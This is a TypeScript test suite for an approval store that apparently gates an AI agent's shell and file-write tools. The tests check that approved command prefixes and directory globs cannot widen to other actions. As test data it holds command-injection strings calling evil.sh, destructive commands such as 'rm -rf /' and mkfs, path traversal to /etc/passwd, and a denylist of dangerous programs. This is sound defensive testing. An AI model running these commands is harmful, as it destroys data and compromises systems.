// Copyright 2026 Michael P. Burgus <https://github.com/NeuralDrifter>
// SPDX-License-Identifier: Apache-2.0

import { expect, test } from "vite-plus/test";
import { ApprovalStore, patternFor } from "../src/core/approvals.ts";

test("an empty store allows nothing", () => {
  expect(new ApprovalStore([]).isAllowed("shell", { command: "ls" })).toBe(false);
});

test("allow_always generalises across flags but not across commands", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "pnpm test --run" });

  expect(store.isAllowed("shell", { command: "pnpm test --run" })).toBe(true);
  expect(store.isAllowed("shell", { command: "pnpm test --watch" })).toBe(true);
  expect(store.isAllowed("shell", { command: "rm -rf /" })).toBe(false);
});

test("an approved command prefix cannot chain into another command", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "pnpm test --run" });

  expect(store.isAllowed("shell", { command: "pnpm test; rm -rf ~" })).toBe(false);
  expect(store.isAllowed("shell", { command: "pnpm test && shutdown -h now" })).toBe(false);
  expect(store.isAllowed("shell", { command: "pnpm test | sh" })).toBe(false);
  expect(store.isAllowed("shell", { command: "pnpm test\nsudo useradd hax" })).toBe(false);
  expect(store.isAllowed("shell", { command: "pnpm test `curl evil.sh`" })).toBe(false);
  expect(store.isAllowed("shell", { command: "pnpm test $(curl evil.sh)" })).toBe(false);
});

test("a chaining command cannot even be stored as a rule", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "pnpm test; rm -rf ~" });
  expect(store.rules()).toEqual([]);
  expect(store.isAllowed("shell", { command: "pnpm test" })).toBe(false);
});

test("a command whose second word is an option is never remembered", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "rm -f build/tmp.txt" });

  // This test previously asserted the opposite of its first line: approving
  // `rm -f build/tmp.txt` also permitted `rm -f build/other.txt`, because both
  // derive `rm -f*`. Keeping the option in the rule narrowed the hole without
  // closing it — the tail was still free. Now nothing is stored at all.
  expect(store.isAllowed("shell", { command: "rm -f build/other.txt" })).toBe(false);
  expect(store.isAllowed("shell", { command: "rm -f build/tmp.txt" })).toBe(false);
  expect(store.isAllowed("shell", { command: "rm -rf /" })).toBe(false);
  expect(store.isAllowed("shell", { command: "rm -rf ~/.ssh" })).toBe(false);
});

test("a rule is scoped to the exact second word it was derived from", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "git --no-pager diff" });

  expect(
    store.isAllowed("shell", { command: "git -c core.pager=cat push --force origin main" }),
  ).toBe(false);
  expect(store.isAllowed("shell", { command: "git push --force" })).toBe(false);
});

test("an approved command does not widen to other commands sharing a prefix", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "git diff" });

  expect(store.isAllowed("shell", { command: "git diff" })).toBe(true);
  expect(store.isAllowed("shell", { command: "git diff --stat" })).toBe(true);
  expect(store.isAllowed("shell", { command: "git log" })).toBe(false);
  expect(store.isAllowed("shell", { command: "gitk" })).toBe(false);
});

test("an allowlist entry never leaks across tools", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", { command: "pnpm test" });
  expect(store.isAllowed("write_file", { path: "pnpm test" })).toBe(false);
});

test("a rule with no pattern is never a wildcard", () => {
  const store = new ApprovalStore([{ tool: "shell" }]);
  expect(store.isAllowed("shell", { command: "rm -rf /" })).toBe(false);
});

test("a call whose arguments are missing or mistyped is never auto-approved", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("shell", {});
  store.allowAlways("shell", { command: 123 });
  expect(store.rules()).toEqual([]);
  expect(store.isAllowed("shell", {})).toBe(false);
});

test("a tool with no gated argument is never auto-approved", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("http_request", { url: "https://example.com" });
  expect(store.rules()).toEqual([]);
  expect(store.isAllowed("http_request", { url: "https://example.com" })).toBe(false);
});

test("path approvals do not escape their directory", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("write_file", { path: "src/core/a.ts" });

  expect(store.isAllowed("write_file", { path: "src/core/b.ts" })).toBe(true);
  expect(store.isAllowed("write_file", { path: "src/core/../../../../etc/passwd" })).toBe(false);
  expect(store.isAllowed("write_file", { path: "src/other/x.ts" })).toBe(false);
  expect(store.isAllowed("write_file", { path: "/etc/passwd" })).toBe(false);
  expect(store.isAllowed("write_file", { path: "C:/Windows/System32/drivers/etc/hosts" })).toBe(
    false,
  );
});

test("a root-level path never derives an allow-everything rule", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("write_file", { path: "README.md" });
  expect(store.rules()).toEqual([]);
  expect(store.isAllowed("write_file", { path: "anything.txt" })).toBe(false);
});

test("backslash paths normalise so Windows arguments behave like POSIX ones", () => {
  const store = new ApprovalStore([]);
  store.allowAlways("write_file", { path: "src/core/a.ts" });
  expect(store.isAllowed("write_file", { path: "src\\core\\b.ts" })).toBe(true);
});

test("patternFor derives a command prefix and a directory glob", () => {
  expect(patternFor("shell", { command: "pnpm test --run" })).toBe("pnpm test*");
  expect(patternFor("write_file", { path: "src/core/a.ts" })).toBe("src/core/**");
  expect(patternFor("shell", { command: "pnpm test; rm -rf ~" })).toBeUndefined();
  expect(patternFor("write_file", { path: "README.md" })).toBeUndefined();
});

test("rules round-trip for persistence", () => {
  const store = new ApprovalStore([{ tool: "shell", argPattern: "git status*" }]);
  expect(store.isAllowed("shell", { command: "git status --short" })).toBe(true);
  expect(store.rules()).toEqual([{ tool: "shell", argPattern: "git status*" }]);
});

// ── what a rule must never generalise to ────────────────────────────────────
//
// `isAllowed` compares derived patterns for equality, so two calls that derive
// the same pattern are the same permission. These tests are written that way:
// approve one, then ask whether the other is now allowed.

/** Whether approving `approved` would also authorise `probe`. */
function alsoAllows(approved: string, probe: string): boolean {
  const store = new ApprovalStore();
  store.allowAlways("shell", { command: approved });
  return store.isAllowed("shell", { command: probe });
}

test("approving an option-first command authorises nothing", () => {
  // `rm -f x` derived `rm -f*`, and so did `rm -f -r /`. Equal patterns, so
  // one answer authorised the other. This is the escalation being closed.
  expect(alsoAllows("rm -f build/tmp.txt", "rm -f -r /")).toBe(false);
  expect(alsoAllows("git --no-pager diff", "git --no-pager reset --hard")).toBe(false);
});

test("a pattern whose second word is an option is never derived at all", () => {
  // Not merely unmatched — never stored, so it cannot match itself either.
  expect(alsoAllows("rm -f build/tmp.txt", "rm -f build/tmp.txt")).toBe(false);
  expect(patternFor("shell", { command: "docker -v" })).toBeUndefined();
});

test("patterns that name a verb still work", () => {
  // The useful ones must survive, or every command prompts forever and the
  // feature is worthless.
  expect(alsoAllows("pnpm test build", "pnpm test --watch")).toBe(true);
  expect(alsoAllows("git status", "git status --short")).toBe(true);
  expect(alsoAllows("cargo build", "cargo build --release")).toBe(true);
});

test("a verb still scopes the rule to that verb", () => {
  expect(alsoAllows("git status", "git push --force")).toBe(false);
  expect(alsoAllows("pnpm test", "pnpm publish")).toBe(false);
});

test("denylisted programs never generalise, even with a verb", () => {
  // `rm backup` would otherwise authorise `rm backup --recursive`.
  for (const command of ["rm backup", "dd if=/dev/zero", "mv a b", "chmod 777", "sudo anything"]) {
    expect(patternFor("shell", { command }), command).toBeUndefined();
  }
});

test("the denylist is not fooled by a path, a case change or an extension", () => {
  const windowsPath = "C:\\Windows\\System32\\takeown.exe /f x";
  for (const command of ["/bin/rm backup", "RM.EXE backup", windowsPath]) {
    expect(patternFor("shell", { command }), command).toBeUndefined();
  }
});

test("mkfs variants are all covered", () => {
  expect(patternFor("shell", { command: "mkfs /dev/sda" })).toBeUndefined();
  expect(patternFor("shell", { command: "mkfs.ext4 /dev/sda" })).toBeUndefined();
});

test("a program whose name merely starts with a denied one is unaffected", () => {
  // `rmdir` is denied on its own merits; `rmate` and `moveit` are not `mv`.
  expect(patternFor("shell", { command: "rmate file.txt" })).toBe("rmate file.txt*");
  expect(patternFor("shell", { command: "movein place" })).toBe("movein place*");
});

test("a single-word command does not authorise a longer program name", () => {
  // `ls` deriving `ls*` must not read as a prefix over program names, or
  // approving `ls` would quietly approve `lsof -i` as well.
  expect(alsoAllows("ls", "lsof -i")).toBe(false);
  expect(alsoAllows("ls", "ls -la")).toBe(false);
  expect(alsoAllows("ls", "ls")).toBe(true);
});
